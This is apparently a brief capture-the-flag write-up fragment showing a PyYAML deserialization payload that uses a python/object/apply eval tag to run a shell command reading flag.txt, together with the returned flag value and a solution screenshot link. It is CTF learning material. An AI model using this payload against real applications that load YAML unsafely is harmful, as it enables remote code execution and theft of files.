- PyYAML deserialization

```yaml
title:
  !!python/object/apply:eval [
    "__import__('os').popen('cat flag.txt').read().strip()",
  ]
```

- Returns

```yaml
title: flag{b692115306c8e5c54a2c8908371a4c72}
```

![Solution](https://raw.githubusercontent.com/j0hn-G4lt/huntressCTF-2025/main/Images/Pasted%20image%2020251101224619.png)
